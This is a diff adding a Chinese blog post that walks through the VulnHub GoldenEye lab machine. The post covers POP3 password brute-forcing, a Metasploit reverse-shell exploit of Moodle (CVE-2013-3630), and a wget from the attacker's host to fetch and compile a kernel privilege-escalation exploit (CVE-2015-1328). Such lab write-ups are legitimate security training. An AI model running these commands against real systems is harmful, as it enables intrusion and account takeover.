@@ -1,0 +1,551 @@
+
+<!DOCTYPE html>
+<html lang="zh-Hans">
+    <head>
+        <meta charset="utf-8" />
+        <title>GoldenEye靶机学习 | 小C♥天天</title>
+        <meta name="author" content="小C&天天" />
+        <meta name="description" content="^v^" />
+        <meta name="keywords" content="" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+        <link rel="icon" href="/images/icon.jpg" />
+        <link rel="preconnect" href="https://cdn.staticfile.org" />
+<script src="https://cdn.staticfile.org/vue/3.3.4/vue.global.prod.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.4.0/css/all.min.css" />
+<link rel="preconnect" href="https://fonts.loli.net" />
+<link rel="preconnect" href="https://gstatic.loli.net" crossorigin />
+<link rel="stylesheet" href="https://fonts.loli.net/css2?family=Fira+Code:wght@400;500;600;700&family=Lexend:wght@400;500;600;700;800;900&family=Noto+Sans+SC:wght@400;500;600;700;800;900&display=swap" />
+<script> const mixins = {}; </script>
+
+<!-- 兼容不同版本的浏览器 -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=default"></script>
+
+
+<!-- 高亮代码 -->
+<script src="https://cdn.staticfile.org/highlight.js/11.8.0/highlight.min.js"></script>
+<script src="https://cdn.staticfile.org/highlightjs-line-numbers.js/2.8.0/highlightjs-line-numbers.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/highlight.js/11.8.0/styles/github.min.css"/>
+<script src="/js/lib/highlight.js"></script>
+
+
+<!-- 使用 KaTeX 渲染数学公式 -->
+<script src="https://cdn.staticfile.org/KaTeX/0.16.8/katex.min.js"></script>
+<script src="https://cdn.staticfile.org/KaTeX/0.16.8/contrib/auto-render.min.js"></script>
+<link rel="stylesheet" href="https://cdn.staticfile.org/KaTeX/0.16.8/katex.min.css" />
+<script src="/js/lib/math.js"></script>
+
+
+<!-- 简单的点击图片放大缩小的预览 -->
+<script src="/js/lib/preview.js"></script>
+
+
+<!-- 看板娘 -->
+<script src="https://cdn.staticfile.org/pixi.js/4.6.1/pixi.min.js"></script>
+
+
+
+<!-- 评论设置 -->
+
+<script
+    src="https://giscus.app/client.js"
+    data-repo="A7cc/giscus-comments"
+    data-repo-id="R_kgDOKKSvfw"
+    data-category="Announcements"
+    data-category-id="DIC_kwDOKKSvf84CYyp2"
+    data-mapping="pathname"
+    data-strict="1"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="bottom"
+    data-theme="https://static-argvchs.netlify.app/css/giscus.css"
+    data-lang="zh-CN"
+    crossorigin
+    async
+></script>
+
+
+
+<script src="https://cdn.bootcdn.net/ajax/libs/animejs/3.2.1/anime.min.js"></script>
+<link rel="stylesheet" href="/css/main.css" />
+
+    <meta name="generator" content="Hexo 6.2.0"></head>
+    <body>
+        <div id="layout">
+            <!-- 页面加载 -->
+            <transition name="fade">
+                <div id="loading" v-show="loading">
+                    <div id="loading-circle">
+                        <h2>LOADING</h2>
+                        <p>正在加载</p>
+                        <img src="/images/afde9fa65a5742a90b51d6e1211e841e.gif" />
+                    </div>
+                </div>
+            </transition>
+            <div id="menu" :class="{ hidden: hiddenMenu, 'menu-color': menuColor}">
+    <nav id="desktop-menu">
+        <a class="title" href="/">
+            <span>小C♥天天</span>
+        </a>
+        
+        <a href="/">
+            <i class="fa-solid fa-house fa-fw"></i>
+            <span>&ensp;主页</span>
+        </a>
+        
+        <a href="/about">
+            <i class="fa-solid fa-id-card fa-fw"></i>
+            <span>&ensp;关于</span>
+        </a>
+        
+        <a href="/archives">
+            <i class="fa-solid fa-box-archive fa-fw"></i>
+            <span>&ensp;文章</span>
+        </a>
+        
+        <a href="/categories">
+            <i class="fa-solid fa-bookmark fa-fw"></i>
+            <span>&ensp;分类</span>
+        </a>
+        
+        <a href="/tags">
+            <i class="fa-solid fa-tags fa-fw"></i>
+            <span>&ensp;标签</span>
+        </a>
+        
+        <a href="/tools">
+            <i class="fa-solid fa-tools fa-fw"></i>
+            <span>&ensp;工具</span>
+        </a>
+        
+    </nav>
+    <nav id="mobile-menu">
+        <div class="title" @click="showMenuItems = !showMenuItems">
+            <i class="fa-solid fa-bars fa-fw"></i>
+            <span>&emsp;小C♥天天</span>
+        </div>
+        <transition name="slide">
+            <div class="items" v-show="showMenuItems">
+                
+                <a href="/">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-house fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">主页</div>
+                    </div>
+                </a>
+                
+                <a href="/about">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-id-card fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">关于</div>
+                    </div>
+                </a>
+                
+                <a href="/archives">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-box-archive fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">文章</div>
+                    </div>
+                </a>
+                
+                <a href="/categories">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-bookmark fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">分类</div>
+                    </div>
+                </a>
+                
+                <a href="/tags">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tags fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">标签</div>
+                    </div>
+                </a>
+                
+                <a href="/tools">
+                    <div class="item">
+                        <div style="min-width: 20px; max-width: 50px; width: 10%">
+                            <i class="fa-solid fa-tools fa-fw"></i>
+                        </div>
+                        <div style="min-width: 100px; max-width: 150%; width: 20%">工具</div>
+                    </div>
+                </a>
+                
+            </div>
+        </transition>
+    </nav>
+</div>
+<transition name="fade">
+    <div id="menu-curtain" @click="showMenuItems = !showMenuItems" v-show="showMenuItems"></div>
+</transition>
+
+            <div id="main" :class="loading ? 'into-enter-from': 'into-enter-active'">
+                <div id="article-posts-wrap" true ref="homePostsWrap">
+    <div class="article">
+        <div>
+            <h1>GoldenEye靶机学习</h1>
+        </div>
+        <div class="info">
+            <span class="date">
+                <span class="icon">
+                    <i class="fa-solid fa-calendar fa-fw"></i>
+                </span>
+                2022/9/8
+            </span>
+            
+            <span class="category">
+                <a href="/categories/vulnhub%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/">
+                    <span class="icon">
+                        <i class="fa-solid fa-bookmark fa-fw"></i>
+                    </span>
+                    vulnhub靶机复现
+                </a>
+            </span>
+            
+            
+            <span class="tags">
+                <span class="icon">
+                    <i class="fa-solid fa-tags fa-fw"></i>
+                </span>
+                
+                
+                <span class="tag">
+                    
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/" style="color: #00bcd4">靶机</a>
+                </span>
+                
+            </span>
+            
+        </div>
+        
+        <div class="content" v-pre>
+            <h1 id="壹-题目信息"><a href="#壹-题目信息" class="headerlink" title="壹 题目信息"></a>壹 题目信息</h1><p>名字：<code>GoldenEye</code><br>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/goldeneye-1,240/">传送门</a><br>靶机<code>IP</code>：<code>192.168.239.147</code></p>
+<span id="more"></span>
+
+<h1 id="贰-解题"><a href="#贰-解题" class="headerlink" title="贰 解题"></a>贰 解题</h1><p>端口扫描：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102155627827.png" alt="image-20221102155627827"></p>
+<p>存在25，80，110，55006，55007端口开放，接着从80入手，访问：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102142450683.png" alt="image-20221102142450683"></p>
+<p>存在两个问题：<code>terminal.js</code>和<code>/sev-home/</code>，分别访问发现<code>http://192.168.239.147/terminal.js</code>存在密码泄露，<code>http://192.168.239.147/sev-home/</code>需要登录：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154111611.png" alt="image-20221102154111611"></p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154121736.png" alt="image-20221102154121736"></p>
+<p><code>http://192.168.239.147/terminal.js</code>存在密码泄露，即将<code>&amp;#73;&amp;#110;&amp;#118;&amp;#105;&amp;#110;&amp;#99;&amp;#105;&amp;#98;&amp;#108;&amp;#101;&amp;#72;&amp;#97;&amp;#99;&amp;#107;&amp;#51;&amp;#114;</code>进行<code>HTML</code>编码，获得密码为：<code>InvincibleHack3r</code>，并且根据提示发现用户名为<code>Boris</code>，由于外国人的名字首字母大写，所以原来的用户名应该是<code>boris</code>：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154254581.png" alt="image-20221102154254581"></p>
+<p>登陆后，查看前端信息发现，包含两个管理员<code>Natalya</code>、<code>Boris</code>，在根据网页里面的提示打开了<code>pop3</code>，回想起前面的两个高端口：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102154826225.png" alt="image-20221102154826225"></p>
+<p>通过<code>telnet</code>访问两个端口发现<code>55007</code>存在<code>pop3</code>：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102160323341.png" alt="image-20221102160323341"></p>
+<p>尝试登录，发现前面的用户名密码已经用不了：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102160939766.png" alt="image-20221102160939766"></p>
+<p>开始尝试爆破，根据前面的两个用户名生成四个用户名<code>Natalya</code>、<code>natalya</code>、<code>Boris</code>、<code>boris</code>：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102163405682.png" alt="image-20221102163405682"></p>
+<pre><code class="bash">[55007][pop3] host: 192.168.239.147   login: Natalya   password: bird
+[55007][pop3] host: 192.168.239.147   login: natalya   password: bird
+[55007][pop3] host: 192.168.239.147   login: Boris   password: secret1!
+[55007][pop3] host: 192.168.239.147   login: boris   password: secret1!
+</code></pre>
+<p><code>Natalya</code>和<code>natalya</code>，<code>Boris</code>和<code>boris</code>属于同一账户，邮件内容一样，登录<code>natalya</code>邮箱进行查看：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102163815629.png" alt="image-20221102163815629"></p>
+<p>查看两封邮件发现，存在一个用户名密码以及一个域名以及<code>/etc/hosts</code>：</p>
+<pre><code class="bash">域名：severnaya-station.com/gnocertdir
+用户名密码：
+username: xenia
+password: RCP90rulez!
+</code></pre>
+<p>登录<code>boris</code>邮箱进行查看：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102164948278.png" alt="image-20221102164948278"></p>
+<p>提示了有一份文件使用<code>GoldenEye</code>作为访问代码作为附件发送，并且放在此服务器的根目录下隐藏文件，但此处无法查看到附件内容，不过我们可以根据<code>natalya</code>邮箱，设置<code>hosts</code>文件，访问：<code>http://severnaya-station.com/gnocertdir/</code>：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102172938877.png" alt="image-20221102172938877"></p>
+<p>可以发现是一个<code>moodle</code>开源<code>cms</code>系统，简单翻阅一下，发现存在登录，尝试前面的用户名密码：<code>xenia\RCP90rulez!</code>，登陆成功：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102173510358.png" alt="image-20221102173510358"></p>
+<p>接着又是翻阅，发现一个用户<code>doak</code>，是邮箱，我们接着对其进行爆破，发现也是弱口令<code>doak\goat</code>：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174232773.png" alt="image-20221102174232773"></p>
+<p>登录查看邮箱，存在一个邮件：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174215718.png" alt="image-20221102174215718"></p>
+<p>查看邮件又获得一个用户名密码<code>dr_doak\4England!</code>：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174406771.png" alt="image-20221102174406771"></p>
+<p>登录该用户，获得一个文件：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174737238.png" alt="image-20221102174737238"></p>
+<p>下载下来了，查看，说在这个目录<code>/dir007key/for-007.jpg</code>有一个图片，可能包含<code>adm1n</code>的信息：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102174915901.png" alt="image-20221102174915901"></p>
+<p>访问<code>http://severnaya-station.com/dir007key/for-007.jpg</code>，下载下来：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102175220107.png" alt="image-20221102175220107"></p>
+<p>对图片进行一遍操作，发现使用<code>exiftool for-007.jpg</code>执行发现有<code>base64</code>编码：<code>eFdpbnRlcjE5OTV4IQ==</code>，必有猫腻，解码为<code>xWinter1995x!</code>，猜测会不会是前面<code>admin</code>的密码：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102175732861.png" alt="image-20221102175732861"></p>
+<p>尝试后发现是<code>admin</code>，登录后，查看有没有有用的信息，可以看到是<code>moodle</code>版本为<code>2.2.3</code>：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221102182325429.png" alt="image-20221102182325429"></p>
+<p>在网上查找对应版本的漏洞，发现为有<code>CVE-2013-3630</code>，尝试使用<code>msf</code>进行攻击：</p>
+<pre><code class="bash">search CVE-2013-3630
+use exploit/multi/http/moodle_spelling_binary_rce
+set username admin
+set password xWinter1995x!
+set rhosts severnaya-station.com
+set targeturi /gnocertdir
+set payload cmd/unix/reverse
+set lhost 192.168.239.142
+options
+</code></pre>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105224206276.png" alt="image-20221105224206276"></p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105224309860.png" alt="image-20221105224309860"></p>
+<p>注意这时候还不可以利用，因为<code>msf</code>的底层代码使用的是<code>pspellshell</code>，网页使用的是<code>Googleshell</code>，导致没有办法去运行，所以在网页的<code>TinyMCE HTML editor</code>处选择<code>pspellshell</code>：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105224656259.png" alt="image-20221105224656259"></p>
+<p>然后利用：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105225020421.png" alt="image-20221105225020421"></p>
+<p>利用后获得的是一个伪<code>shell</code>，所以我们可以使用<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39; </code>获得一个交互的<code>shell</code>：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105225348124.png" alt="image-20221105225348124"></p>
+<p>查看系统信息，发现内核版本<code>Linux ubuntu 3.13.0-32</code>，存在<code>CVE-2015-1328</code>提取漏洞，<code>kali</code>里有<code>CVE-2015-1328</code>攻击脚本：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105230236330.png" alt="image-20221105230236330"></p>
+<pre><code class="bash">searchsploit 37292
+cp /usr/share/exploitdb/exploits/linux/local/37292.c /root/桌面/
+// 由于靶场无法进行gcc编译，需要改成cc，即编辑脚本37292.c，将第143行的gcc改成cc
+</code></pre>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105230458058.png" alt="image-20221105230458058"></p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105230116214.png" alt="image-20221105230116214"></p>
+<p>然后在存在<code>exp</code>的目录下开<code>http</code>服务：<code>python2 -m SimpleHTTPServer 8888</code>，接着在<code>msf</code>获得的靶机终端，执行<code>wget http://10.10.10.129:8888/37292.c</code>，并编译<code>cc -o exp 37292.c </code>，最后执行<code>exp</code>，在<code>/root</code>目录下的<code>.flag.txt</code>获得<code>flag</code>：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231013332.png" alt="image-20221105231013332"></p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231409418.png" alt="image-20221105231409418"></p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231701284.png" alt="image-20221105231701284"></p>
+<p>根据提示访问<code>http://severnaya-station.com/006-final/xvf7-flag/</code>：</p>
+<p><img src="/images/vulnhub%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/GoldenEye%E9%9D%B6%E6%9C%BA%E5%AD%A6%E4%B9%A0/image-20221105231939196.png" alt="image-20221105231939196"></p>
+<h1 id="叁-需要学习的知识"><a href="#叁-需要学习的知识" class="headerlink" title="叁 需要学习的知识"></a>叁 需要学习的知识</h1><ul>
+<li><code>pop</code>服务访问</li>
+<li><code>Linux</code>提权：<code>CVE-2015-1328</code></li>
+</ul>
+
+        </div>
+        
+        
+        <div id="comment">
+            <div id="giscus-container" class="giscus"></div>
+        </div>
+        
+    </div>
+    
+    <div id="article-card">
+        <div id="card-style">
+    <div id="card-div" class="card-cls">
+        <div class="avatar">
+            <img src="/images/f6e2b991f74bfd7b88c3ab1a3d513b94.jpg" alt="avatar" />
+        </div>
+        <div class="name">小C&amp;天天</div>
+        <div class="description">
+            <p>修学储能 先博后渊</p>
+
+        </div>
+        
+        <div class="icon-links">
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://github.com/A7cc">
+                    <i class="fa-brands fa-github fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.qq.com/">
+                    <i class="fa-brands fa-qq fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://www.weibo.com/">
+                    <i class="fa-brands fa-weibo fa-fw"></i>
+                </a>
+            </span>
+            
+            <span class="icon-link">
+                <a target="_blank" rel="noopener" href="https://google.com/">
+                    <i class="fa-brands fa-google fa-fw"></i>
+                </a>
+            </span>
+            
+        </div>
+        
+        
+        <div class="friend-links">
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="http://www.wgs6km.top/">kyrieee</a>
+            </span>
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="https://tonyd0g.gitee.io/">tonyd0g</a>
+            </span>
+            
+            <span class="friend-link">
+                <a target="_blank" rel="noopener" href="https://ruyueattention.github.io/">ruyueattention</a>
+            </span>
+            
+        </div>
+        
+    </div>
+    
+    <!-- <br /> -->
+    <!-- 目录 -->
+    <!-- 
+    <div id="card-div">
+        <div id="toc" class="toc-article">
+            <strong class="toc-title">文章目录</strong>
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%A3%B9-%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="toc-text">壹 题目信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%B4%B0-%E8%A7%A3%E9%A2%98"><span class="toc-text">贰 解题</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%81-%E9%9C%80%E8%A6%81%E5%AD%A6%E4%B9%A0%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="toc-text">叁 需要学习的知识</span></a></li></ol>
+        </div>    
+    </div>
+     -->
+</div>
+
+<div id="card-style-fun">
+    
+    <br />
+    <!-- 今日诗句 -->
+    <div id="card-div">
+        <div class="good-sentence">
+            <div class="toolio">
+                <div class="circle"><span class="red"></span></div>
+                <div class="circle"><span class="yellow"></span></div>
+                <div class="circle"><span class="green"></span></div>
+                <div class="circle"><span class="text">今日诗句</span></div>
+            </div>
+            <div class="sentence">
+                <div id="sentenceid" onload="getsentence();"></div>
+            </div>
+        </div>
+    </div>
+    <br />
+    <!-- 日期信息 -->
+    <div id="card-div">
+        <img src="//api.vvhan.com/api/ipCard?tip=A7cc" width="300" height="180">
+    </div>
+    
+</div>
+
+
+
+    </div>
+    
+</div>
+                <!-- 页脚 -->
+                <footer id="footer">
+    <div id="footer-wrap">
+        <div>
+            <span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+            <script>
+                var now = new Date(); 
+                function createtime() { 
+                    var grt= new Date("07/10/2022 00:00:00");
+                    now.setTime(now.getTime()+250); 
+                    days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days); 
+                    hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours); 
+                    if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum); 
+                    mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;} 
+                    seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum); 
+                    snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;} 
+                    document.getElementById("timeDate").innerHTML = "已运行 "+dnum+" 天 "; 
+                    document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+                } 
+            setInterval("createtime()",250);
+            </script>
+        </div>
+        <div>
+            &copy;
+            2022 - 2023 小C♥天天
+            <span class="footer-icon">
+                <i class="fa-brands fa-github fa-fw"></i>
+            </span>
+            &commat;小C&amp;天天
+        </div>
+        <div>
+            Powered by <a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a> &amp;
+            <a target="_blank" rel="noopener" href="https://github.com/theme-particlex/hexo-theme-particlex">ParticleX</a> 
+        </div>
+        
+    </div>
+</footer>
+
+            </div>
+            <!-- 简单的点击图片放大缩小的预览 -->
+            
+            <div name="fade">
+                <div id="preview" ref="preview" v-show="previewShow">
+                    <img id="preview-content" ref="previewContent" />
+                </div>
+            </div>
+            
+        </div>
+        <!-- 看板娘 -->
+        
+        <div id="L2dCanvas"></div>
+        <script src="/js/lib/live2d.min.js"></script>
+        <!-- 设置随机模板 -->
+        
+        <script>
+            var v = new Viewer({
+                basePath: "/model",
+                role: "heitaizi_2",
+                mobile: true,
+            });
+        </script>
+        
+        <!-- 诗句 -->
+        
+        <script>
+            // // 每隔10分钟执行一次getsentence这个函数
+            window.setInterval(getsentence, 100*60*5);
+            function getsentence() {
+                // 这里没有考虑IE浏览器，如果需要择if判断加
+                var xhr = new XMLHttpRequest();  
+                xhr.open('GET', "https://zj.v.api.aa1.cn/api/wenan-shici/?type=json",true);
+                xhr.send(JSON.stringify(null));
+                xhr.onreadystatechange = function () {
+                    if (xhr.status === 200 && xhr.readyState === 4) {
+                        //js处理数据
+                        // xhr.responseText.match(/content":(".+?")/g)
+                        getdata = JSON.parse(xhr.responseText).msg;
+                    }else{
+                        getdata = "长风破浪会有时，直挂云帆济沧海。——李白《行路难》";
+                    }
+                    document.getElementById("sentenceid").innerHTML = getdata;
+                }
+            }
+            window.onload = getsentence;
+        </script>
+        
+        <!-- 点击 -->
+        <script>
+            let body = document.getElementsByTagName('body')[0];
+            body.addEventListener('click', (e) => {
+                let contentArr = ['✊','😘','😍','😊','😭','😡','😋','👍','🐷','😱','💷','💵','×','🆗','№','⭐','🌙','♥','💴','☀','🐎','🐂','🐏','√'];
+                let randomNum = function (n) {
+                    return Math.floor(Math.random() * n)
+                }
+                let span = document.createElement('span');
+                span.innerHTML = `${contentArr[randomNum(contentArr.length)]}`;
+                span.style.color = `rgb(${randomNum(256)},${randomNum(256)},${randomNum(256)})`;
+                span.style.position = 'absolute';
+                span.style.top = `${e.pageY}px`;
+                span.style.left = `${e.pageX}px`;
+                span.style.transition = 'all 1s ease';
+                span.style.zIndex = 20000;
+                body.appendChild(span)
+                setTimeout(()=>{
+                    span.style.top = span.offsetTop - 100 + 'px';
+                    span.style.opacity = 0;
+                    setTimeout(()=>{span.remove()},700)
+                },0)
+            })
+        </script>
+        <!-- 流星背景特效 -->
+        
+        <canvas id="background" style="position:fixed;top:0;left:0;width:100vw;height:100vh;pointer-events:none;z-index:-1"></canvas>
+        <script src="/js/meteorbackground.js"></script>
+        
+        <script src="/js/main.js"></script>
+    </body>
+</html>
